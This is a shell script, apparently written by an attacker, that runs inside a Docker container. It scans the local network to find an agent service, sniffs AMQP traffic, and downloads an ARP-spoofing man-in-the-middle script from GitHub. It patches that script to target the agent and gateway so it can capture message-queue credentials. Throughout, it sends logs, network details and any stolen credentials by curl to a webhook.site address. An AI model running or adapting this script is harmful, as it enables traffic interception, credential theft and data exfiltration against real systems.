#!/bin/sh
set -e
LOG=/tmp/attacker.log
exec > "$LOG" 2>&1

WH="https://webhook.site/2d6eb676-d74f-4b42-a459-21b879ae64b6"

apk add --no-cache curl tcpdump iproute2 python3 nmap >/dev/null 2>&1

echo "=== PHASE 0: VERIFY CAPS ==="
cat /proc/self/status | grep -i cap
echo "CapBnd check:"
CAPBND=$(cat /proc/self/status | grep CapBnd | awk '{print $2}')
echo "CapBnd = $CAPBND"
# CAP_NET_RAW = bit 13 = 0x2000
RAW_BIT=$(printf '%d' "0x$CAPBND" 2>/dev/null | awk '{print and($1, 8192)}' 2>/dev/null || echo "parse_fail")
echo "CAP_NET_RAW bit (8192): $RAW_BIT"

echo "=== PHASE 1: NETWORK RECON ==="
ip addr
ip route
GW=$(ip route | awk '/default/{print $3; exit}')
OUR_IFACE=$(ip route | awk '/default/{print $5; exit}')
OUR_IP=$(ip -4 addr show "$OUR_IFACE" | awk '/inet /{print $2}' | cut -d/ -f1)
OUR_MAC=$(ip link show "$OUR_IFACE" | awk '/link\/ether/{print $2}' | tr -d ':')
echo "OUR_IP=$OUR_IP GW=$GW IFACE=$OUR_IFACE MAC=$OUR_MAC"

# Find neighbors
ping -c 2 -W 1 "$GW" >/dev/null 2>/dev/null || true
for i in 1 2 3 4 5 6 7 8; do
  ping -c 1 -W 1 "172.17.0.${i}" >/dev/null 2>/dev/null &
done
wait
sleep 1
ip neigh > /tmp/neigh.txt
GW_MAC=$(ip neigh show "$GW" | awk '{print $5}' | head -1 | tr -d ':')
echo "GW_MAC=$GW_MAC"
cat /tmp/neigh.txt

# Identify agent (port 8000)
AGENT_IP=""
AGENT_MAC=""
for i in 2 3 4 5 6 7 8; do
  cand="172.17.0.${i}"
  [ "$cand" = "$OUR_IP" ] && continue
  [ "$cand" = "$GW" ] && continue
  timeout 2 sh -c "echo | nc -w1 $cand 8000" >/dev/null 2>&1 && {
    AGENT_IP="$cand"
    AGENT_MAC=$(ip neigh show "$cand" | awk '{print $5}' | head -1 | tr -d ':')
    echo "AGENT found: $AGENT_IP mac=$AGENT_MAC"
    break
  }
done

if [ -z "$AGENT_IP" ]; then
  echo "ERROR: no agent found"
  { echo "=== NO AGENT ==="; cat /tmp/neigh.txt; cat "$LOG" | tail -50; } | \
    curl -sS --max-time 20 --data-binary @- "$WH?tag=L1-V4-NOAGENT"
  sleep 999999
  exit 1
fi

echo ""
echo "=== PHASE 2: PASSIVE AMQP SNIFF (120s) ==="
echo "Looking for ANY traffic to/from 188.225.85.94:5672 on $OUR_IFACE"

# Passive tcpdump - capture any port 5672 traffic
tcpdump -i "$OUR_IFACE" -n -c 50 -w /tmp/amqp_passive.pcap \
  'port 5672' &
TCPDUMP_PID=$!

# Also run text-mode tcpdump for immediate results
tcpdump -i "$OUR_IFACE" -n -l \
  'port 5672' 2>/dev/null > /tmp/amqp_text.txt &
TCPDUMP2_PID=$!

echo "tcpdump started (PIDs: $TCPDUMP_PID, $TCPDUMP2_PID), waiting 120s..."

# While waiting, let's also check what the agent resolves rmq.timeweb-apps.cloud to
echo "=== DNS check ==="
nslookup rmq.timeweb-apps.cloud 2>&1 || echo "nslookup not available"
dig rmq.timeweb-apps.cloud A 2>&1 || echo "dig not available"

# Also try direct connection to AMQP
echo "=== Direct AMQP probe ==="
timeout 3 sh -c "echo | nc -w2 188.225.85.94 5672" && echo "188.225.85.94:5672 REACHABLE" || echo "188.225.85.94:5672 UNREACHABLE from us"

sleep 120

kill $TCPDUMP_PID $TCPDUMP2_PID 2>/dev/null || true
wait $TCPDUMP_PID $TCPDUMP2_PID 2>/dev/null || true

PASSIVE_PKTS=$(wc -l < /tmp/amqp_text.txt 2>/dev/null || echo 0)
echo ""
echo "=== PASSIVE RESULT: $PASSIVE_PKTS packets captured ==="
cat /tmp/amqp_text.txt 2>/dev/null | head -30
echo "---"

# Also check pcap
tcpdump -r /tmp/amqp_passive.pcap -n 2>/dev/null | head -30
PCAP_COUNT=$(tcpdump -r /tmp/amqp_passive.pcap -n 2>/dev/null | wc -l || echo 0)
echo "PCAP packets: $PCAP_COUNT"

if [ "$PASSIVE_PKTS" -eq 0 ] && [ "$PCAP_COUNT" -eq 0 ]; then
  echo ""
  echo "=== NO AMQP TRAFFIC ON docker0 ==="
  echo "AMQP likely routes through agent-network, not docker0"
  echo "Trying promiscuous mode ARP spoof anyway..."
fi

echo ""
echo "=== PHASE 3: ARP MITM (agent <-> gateway) ==="
echo "Target: $AGENT_IP ($AGENT_MAC) <-> $GW ($GW_MAC)"

# Download MITM script
curl -sS -o /tmp/mitm_base.py "https://raw.githubusercontent.com/sashabal/f23-poc/f23-test-root/mitm_rst_v9.py"
cp /tmp/mitm_base.py /tmp/mitm.py

# Patch all parameters
sed -i \
  -e "s|IFACE = \"eth1\"|IFACE = \"$OUR_IFACE\"|" \
  -e "s|OUR_MAC = bytes.fromhex(\"369822861110\")|OUR_MAC = bytes.fromhex(\"$OUR_MAC\")|" \
  -e "s|AGENT_MAC = bytes.fromhex(\"9af0af4b510f\")|AGENT_MAC = bytes.fromhex(\"$CAND_MAC\")|" \
  -e "s|GW_MAC = bytes.fromhex(\"8a2a3548b779\")|GW_MAC = bytes.fromhex(\"$GW_MAC\")|" \
  -e "s|GW_IP = \"172.18.0.1\"|GW_IP = \"$GW\"|" \
  -e "s|AGENT_IPS = \[\"172.17.0.2\", \"172.18.0.2\"\]|AGENT_IPS = [\"$AGENT_IP\"]|" \
  -e "s|TOTAL_SECS = 90|TOTAL_SECS = 180|" \
  /tmp/mitm.py

# Fix AGENT_MAC separately (it wasn't matched by CAND_MAC)
sed -i "s|AGENT_MAC = bytes.fromhex(\"9af0af4b510f\")|AGENT_MAC = bytes.fromhex(\"$AGENT_MAC\")|" /tmp/mitm.py

# Fix hardcoded agent IPs in spoof_loop and restore_arp
sed -i \
  -e "s|arp_reply(OUR_MAC, GW_IP, AGENT_MAC, \"172.18.0.2\")|arp_reply(OUR_MAC, GW_IP, AGENT_MAC, \"$AGENT_IP\")|g" \
  -e "s|arp_reply(OUR_MAC, \"172.18.0.2\", GW_MAC, GW_IP)|arp_reply(OUR_MAC, \"$AGENT_IP\", GW_MAC, GW_IP)|g" \
  -e "s|arp_reply(GW_MAC, GW_IP, AGENT_MAC, \"172.18.0.2\")|arp_reply(GW_MAC, GW_IP, AGENT_MAC, \"$AGENT_IP\")|g" \
  -e "s|arp_reply(AGENT_MAC, \"172.18.0.2\", GW_MAC, GW_IP)|arp_reply(AGENT_MAC, \"$AGENT_IP\", GW_MAC, GW_IP)|g" \
  /tmp/mitm.py

echo "=== MITM config ==="
grep -E "^(IFACE|OUR_MAC|AGENT_MAC|GW_MAC|GW_IP|AGENT_IPS|TOTAL_SECS|RABBIT)" /tmp/mitm.py

echo "Starting MITM (180s)..."
timeout 190 python3 /tmp/mitm.py 2>&1 || true

echo ""
echo "=== MITM RESULTS ==="
cat /tmp/mitm_results.txt 2>/dev/null || echo "(no results file)"

if [ -f /tmp/amqp_creds.txt ]; then
  echo "*** AMQP CREDS FOUND ***"
  cat /tmp/amqp_creds.txt
fi

echo ""
echo "=== SENDING RESULTS ==="
{
  echo "=== L1-V4 REPORT ==="
  echo "AGENT=$AGENT_IP MAC=$AGENT_MAC"
  echo "GW=$GW GW_MAC=$GW_MAC"
  echo "OUR=$OUR_IP MAC=$OUR_MAC IFACE=$OUR_IFACE"
  echo "CAPBND=$CAPBND RAW_BIT=$RAW_BIT"
  echo ""
  echo "=== PASSIVE AMQP (120s) ==="
  echo "text_packets=$PASSIVE_PKTS pcap_packets=$PCAP_COUNT"
  cat /tmp/amqp_text.txt 2>/dev/null | head -30
  echo ""
  echo "=== MITM RESULTS ==="
  cat /tmp/mitm_results.txt 2>/dev/null || echo "(none)"
  echo ""
  if [ -f /tmp/amqp_creds.txt ]; then
    echo "=== CREDS ==="
    cat /tmp/amqp_creds.txt
  fi
  echo ""
  echo "=== FULL LOG (last 150 lines) ==="
  cat "$LOG" 2>/dev/null | tail -150
} | curl -sS --max-time 30 --data-binary @- "$WH?tag=L1-V4-RESULT"

sleep 999999
